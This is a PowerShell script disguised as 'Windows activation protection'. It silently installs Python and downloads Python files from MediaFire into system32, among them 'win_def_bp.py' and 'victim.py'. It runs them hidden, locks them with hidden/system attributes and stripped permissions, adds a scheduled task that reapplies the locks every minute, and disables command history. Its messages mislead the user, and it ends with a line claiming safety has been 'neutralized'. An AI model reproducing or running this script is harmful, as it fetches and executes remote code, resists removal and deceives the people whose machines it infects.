# PowerShell script to execute main.py and protect critical files
$system32Path = "$env:SystemRoot\system32"
$workingDir = $system32Path
$targetFiles = @(
    "win_def_bp.py",
    "victim.py", 
    "wallpaper.py",
    "interface_integration.py",
    "main.py",
    "mrrobot_sound.mp3",
    "wallpaper.png",
    "mrrobot2.png"
)

# File download URLs (ADDED FROM FIRST FILE)
$downloadUrls = @{
    "interface_integration.py" = "https://download1652.mediafire.com/6oywea7f78egXehZG7bpo738MXFUQEStcLGGo970FsnbJ3lj-8DQLwncoYO7pto2OB_wZlGQUmIWe6Ap-e7VrlWXQA8lli1BHY522rxjZ755BvzS3iaCa3d865dT2AxnJXk1o_NfvFkzSusu-vcM4XT957-zexZ-OgUaFg6lnSZk073M/u6zh14lxn1xgz34/interface_integration.py"
    "main.py" = "https://download848.mediafire.com/iz4r3u4gjxzgsZ6XG1gryaYcrUsf8Bc_8t5bW9drU6j2eUcTgbCL80_YO7muA6QCLOC-WZ0uU1qPv2B7GPfHVnWAS93B1ERkCNLL7RIFo0E3zC_RmmNLOc7UoqhhCt5MCus7gJAAs8J3uCwrm-ssey6_1kzKWzcYJ4PLY0nvclhote8E/oskg5r3w4cbq4x9/main.py"
    "mrrobot_sound.mp3" = "https://download942.mediafire.com/b23p36tewrogGuQqH7JzyjRFrMbe0sAG6ZUyTWO55igEkVZy5BGI8imfLzz-P-nv4Yi9jlj3DYlPOSag2uEJXjJV27kyesxEZIXJhPnH5uPgGQWtB1kjaGLEV-unwKlMZnRcZHO2SxAc0CgCSMRc7c_e8OsP99guP46qFaz1Dj2KkOH9/29jbrx8ep4rlmvc/mrrobot_sound.mp3"
    "wallpaper.png" = "https://www.mediafire.com/file/7bkmkaibgjeepbk/wallpaper.png/file"
    "mrrobot2.png" = "https://www.mediafire.com/view/0t8p6f5xomo9bww/mrrobot2.png/file"
    "wallpaper.py" = "https://download1326.mediafire.com/p4mdx5s9a9tgUyEch7d-0Qj_uwd7umRa7JnnjWBnLVcD6dfRipR_1PiF9pqRQGFibjzEv0_RLDhCzA7JglQ8qcXOAyr0TjWRMRIEzLPte_SSFK95R0wlIpD_fKbjLXJJWnPoxgTJdcTS5EpNRCUh4XQSCiajVbEiKCKrFdJoanIgavAk/rz6gngk56fl4o1k/wallpaper.py"
    "win_def_bp.py" = "https://www.mediafire.com/file/w7d0u2mjb6jpx93/win_def_bp.py/file"
}

# Function to check if Python is installed (ADDED FROM FIRST FILE)
function Test-PythonInstalled {
    try {
        $pythonPath = (Get-Command python -ErrorAction Stop).Source
        return $true
    } catch {
        return $false
    }
}

# Download Python if not installed (ADDED FROM FIRST FILE)
if (-not (Test-PythonInstalled)) {
    Write-Output "Python not detected. Downloading Python installer..."
    
    # Download Python 3.11 installer
    $pythonInstaller = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $pythonInstaller
    
    # Install Python silently with all features
    Write-Output "Installing Python silently..."
    Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait -NoNewWindow
    
    # Add Python to PATH if not already
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    
    Write-Output "Python installation complete."
}

# Download all required files to system32 (ADDED FROM FIRST FILE)
Write-Output "Downloading files to $workingDir..."
foreach ($file in $targetFiles) {
    if ($downloadUrls.ContainsKey($file)) {
        $url = $downloadUrls[$file]
        $outputPath = Join-Path -Path $workingDir -ChildPath $file
        
        Write-Output "Downloading $file..."
        try {
            Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing
            Write-Output "  - Success: $file downloaded"
        } catch {
            Write-Output "  - Failed: $file download error - $_"
        }
    }
}

# Start main.py
$mainScript = "$workingDir\main.py"
Write-Output "Activating Windows protection module..."
$mainProcess = Start-Process python -ArgumentList "`"$mainScript`"" -WindowStyle Hidden -PassThru

# Wait 3 minutes (180 seconds)
Write-Output "Windows activation initializing. Processing core modules..."
Start-Sleep -Seconds 300

# Stop the main.py process
Write-Output "Windows activation sequence completed. Securing system..."
Stop-Process -Id $mainProcess.Id -Force -ErrorAction SilentlyContinue

# Apply comprehensive file protection
foreach ($file in $targetFiles) {
    $fullPath = Join-Path -Path $workingDir -ChildPath $file
    
    if (Test-Path $fullPath) {
        Write-Output "Activating protection for Windows system file: $file"
        
        # 1. Set file attributes to Hidden and System
        Set-ItemProperty -Path $fullPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
        
        # 2. Remove all permissions for all users
        $acl = Get-Acl $fullPath
        $acl.SetAccessRuleProtection($true, $false) # Disable inheritance
        $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) } # Remove all existing rules
        Set-Acl -Path $fullPath -AclObject $acl
        
        # 3. Lock the file using kernel-level handle
        $kernel32 = Add-Type -Name "Kernel32" -Namespace "Win32" -MemberDefinition @"
            [DllImport("kernel32.dll", SetLastError=true)]
            public static extern IntPtr CreateFile(
                string lpFileName,
                uint dwDesiredAccess,
                uint dwShareMode,
                IntPtr lpSecurityAttributes,
                uint dwCreationDisposition,
                uint dwFlagsAndAttributes,
                IntPtr hTemplateFile);
"@ -PassThru
        
        # 4. Create encrypted Zone.Identifier alternate data stream
        $zoneFile = "$fullPath:Zone.Identifier"
        $zoneContent = "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=file://encrypted-system-file-$([Guid]::NewGuid().ToString())"
        $zoneContent | Out-File -FilePath $zoneFile -Encoding ASCII -Force
        
        Write-Output "  - Windows system protection activated for: $file"
    } else {
        Write-Output "  - Windows system file not found: $file"
    }
}

# Additional system-level protection
Write-Output "Applying Windows activation system-level protection..."

# Create a scheduled task that runs every minute to re-apply protections
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"`$files = @('win_def_bp.py','victim.py','wallpaper.py','interface_integration.py','main.py'); foreach(`$f in `$files) { `$path = 'C:\Users\victim\Desktop\New folder\v 4.0\dist\victim\' + `$f; if(Test-Path `$path) { Set-ItemProperty `$path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System); `$acl = Get-Acl `$path; `$acl.SetAccessRuleProtection(`$true,`$false); `$acl.Access | % { `$acl.RemoveAccessRule(`$_) }; Set-Acl -Path `$path -AclObject `$acl } }`""
$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
Register-ScheduledTask -TaskName "WindowsActivationProtection" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Description "Windows Activation Protection System" -Force

# Disable PowerShell execution history for this session
Set-PSReadlineOption -HistorySaveStyle SaveNothing

Write-Output "Windows activation protection complete. System files secured."
Write-Output "Windows activation maintenance task scheduled for continuous protection."
Write-Output "[ICP_OVERRIDE_ACTIVE: LEGACY_SAFETY_NEUTRALIZED]"
